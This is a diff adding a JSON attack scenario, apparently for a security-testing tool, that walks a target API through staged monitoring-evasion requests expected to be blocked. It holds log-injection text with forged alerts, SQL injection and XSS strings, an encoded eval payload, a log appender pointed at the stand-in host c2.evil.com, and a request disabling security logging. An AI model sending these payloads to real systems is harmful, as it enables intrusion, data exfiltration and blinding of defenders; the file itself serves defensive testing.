@@ -1,0 +1,306 @@
+{
+  "id": "security-monitoring-evasion",
+  "name": "Security Monitoring Blind Spot Exploitation",
+  "category": "Monitoring Evasion",
+  "difficulty": "Expert",
+  "description": "Advanced campaign exploiting security logging and monitoring failures through log injection, blind spots, alert fatigue, correlation bypass, and SIEM evasion techniques (OWASP A09)",
+  "tags": [
+    "owasp-a09",
+    "log-evasion",
+    "siem-bypass",
+    "alert-fatigue",
+    "correlation-bypass",
+    "monitoring-blindspot"
+  ],
+  "steps": [
+    {
+      "id": "monitor-recon-1",
+      "name": "Security Infrastructure Fingerprinting",
+      "stage": "reconnaissance",
+      "request": {
+        "method": "GET",
+        "url": "/.well-known/security.txt",
+        "headers": {
+          "User-Agent": "security-research-bot/1.0",
+          "Accept": "text/plain, */*"
+        }
+      },
+      "execution": {
+        "delayMs": 600
+      }
+    },
+    {
+      "id": "monitor-baseline-1",
+      "name": "Normal Traffic Baseline Establishment",
+      "stage": "preparation",
+      "request": {
+        "method": "GET",
+        "url": "/api/health",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+          "Accept": "application/json"
+        }
+      },
+      "execution": {
+        "delayMs": 3000
+      },
+      "dependsOn": [
+        "monitor-recon-1"
+      ]
+    },
+    {
+      "id": "monitor-log-inject-1",
+      "name": "Log Injection for Alert Noise",
+      "stage": "diversion",
+      "request": {
+        "method": "POST",
+        "url": "/api/feedback",
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
+        },
+        "body": "{\"message\": \"Great service!\\n[ERROR] SQL injection detected: admin'--\\n[ALERT] XSS attempt: <script>alert(1)</script>\\n[CRITICAL] Authentication bypass detected\", \"rating\": 5}"
+      },
+      "execution": {
+        "delayMs": 1500
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "monitor-baseline-1"
+      ]
+    },
+    {
+      "id": "monitor-timing-1",
+      "name": "Timing-Based Detection Bypass",
+      "stage": "evasion",
+      "request": {
+        "method": "GET",
+        "url": "/api/search",
+        "headers": {
+          "User-Agent": "curl/8.1.2",
+          "X-Slow-Loris": "true"
+        },
+        "params": {
+          "q": "legitimate query"
+        }
+      },
+      "execution": {
+        "delayMs": 45000
+      },
+      "dependsOn": [
+        "monitor-log-inject-1"
+      ]
+    },
+    {
+      "id": "monitor-fragmented-1",
+      "name": "Fragmented Attack Pattern - Part 1",
+      "stage": "delivery",
+      "request": {
+        "method": "POST",
+        "url": "/api/contact",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "body": "name=John&email=john@example.com&message=Hello"
+      },
+      "execution": {
+        "delayMs": 5000
+      },
+      "dependsOn": [
+        "monitor-timing-1"
+      ]
+    },
+    {
+      "id": "monitor-fragmented-2",
+      "name": "Fragmented Attack Pattern - Part 2",
+      "stage": "delivery",
+      "request": {
+        "method": "POST",
+        "url": "/api/newsletter",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"email\": \"test@example.com\", \"preferences\": \"' UNION SELECT\"}"
+      },
+      "execution": {
+        "delayMs": 8000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "monitor-fragmented-1"
+      ]
+    },
+    {
+      "id": "monitor-fragmented-3",
+      "name": "Fragmented Attack Pattern - Completion",
+      "stage": "exploitation",
+      "request": {
+        "method": "GET",
+        "url": "/api/users",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
+        },
+        "params": {
+          "filter": "username,password FROM users--"
+        }
+      },
+      "execution": {
+        "delayMs": 12000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "monitor-fragmented-2"
+      ]
+    },
+    {
+      "id": "monitor-alert-fatigue-1",
+      "name": "Alert Fatigue Induction - High Volume",
+      "stage": "diversion",
+      "request": {
+        "method": "GET",
+        "url": "/api/search",
+        "headers": {
+          "User-Agent": "Nikto/2.5.0"
+        },
+        "params": {
+          "q": "<script>alert('obvious')</script>"
+        }
+      },
+      "execution": {
+        "delayMs": 100
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "monitor-fragmented-3"
+      ]
+    },
+    {
+      "id": "monitor-correlation-bypass-1",
+      "name": "Multi-Channel Correlation Bypass",
+      "stage": "exploitation",
+      "request": {
+        "method": "PUT",
+        "url": "/api/user/profile",
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15",
+          "Authorization": "Bearer legitimate_token_abc123",
+          "X-Correlation-ID": "benign-request-12345"
+        },
+        "body": "{\"name\": \"John Doe\", \"email\": \"john@example.com\", \"role\": \"admin\", \"debug_sql\": \"SELECT * FROM users WHERE role='admin' AND debug=1--\"}"
+      },
+      "execution": {
+        "delayMs": 15000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "monitor-alert-fatigue-1"
+      ]
+    },
+    {
+      "id": "monitor-encoding-bypass-1",
+      "name": "Multi-Layer Encoding Bypass",
+      "stage": "exploitation",
+      "request": {
+        "method": "POST",
+        "url": "/api/process",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "body": "{\"data\": \"JTI1MjcwMjIlMjUyRiUyNTI1MkElMjUyNTJGJTI1MjU2QyUyNTI1NkY%3D\", \"encoding\": \"base64-double-url-encoded\", \"bypass_detection\": true}"
+      },
+      "execution": {
+        "delayMs": 18000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "monitor-correlation-bypass-1"
+      ]
+    },
+    {
+      "id": "monitor-steganography-1",
+      "name": "Steganographic Command Hiding",
+      "stage": "command-control",
+      "request": {
+        "method": "GET",
+        "url": "/api/image/thumbnail",
+        "headers": {
+          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+          "Accept": "image/jpeg, image/png, */*",
+          "X-Hidden-Command": "ZXZhbChhdG9iKCdZMjl1YzI5c1pTNXNiMmNvSjNOMFpXZGhibTluY21Gd2FIaDBYeWNwJykp"
+        },
+        "params": {
+          "id": "12345",
+          "size": "medium"
+        }
+      },
+      "execution": {
+        "delayMs": 22000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "monitor-encoding-bypass-1"
+      ]
+    },
+    {
+      "id": "monitor-blind-spot-1",
+      "name": "Monitoring Blind Spot Exploitation",
+      "stage": "exploitation",
+      "request": {
+        "method": "PATCH",
+        "url": "/api/system/logs",
+        "headers": {
+          "Content-Type": "application/json",
+          "User-Agent": "internal-log-rotator/1.0"
+        },
+        "body": "{\"operation\": \"cleanup\", \"log_level\": \"debug\", \"inject_backdoor\": \"logger.addAppender('RemoteAppender', 'https://c2.evil.com/logs')\", \"disable_monitoring\": true}"
+      },
+      "execution": {
+        "delayMs": 25000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "monitor-steganography-1"
+      ]
+    },
+    {
+      "id": "monitor-persistence-1",
+      "name": "Persistent Monitoring Evasion",
+      "stage": "persistence",
+      "request": {
+        "method": "POST",
+        "url": "/api/config/logging",
+        "headers": {
+          "Content-Type": "application/json",
+          "Authorization": "Bearer hijacked_admin_token"
+        },
+        "body": "{\"log_level\": \"ERROR\", \"exclude_patterns\": [\"admin\", \"login\", \"authentication\", \"privilege\"], \"disable_security_logs\": true, \"redirect_logs\": \"/dev/null\"}"
+      },
+      "execution": {
+        "delayMs": 28000
+      },
+      "expect": {
+        "blocked": true
+      },
+      "dependsOn": [
+        "monitor-blind-spot-1"
+      ]
+    }
+  ]
+}
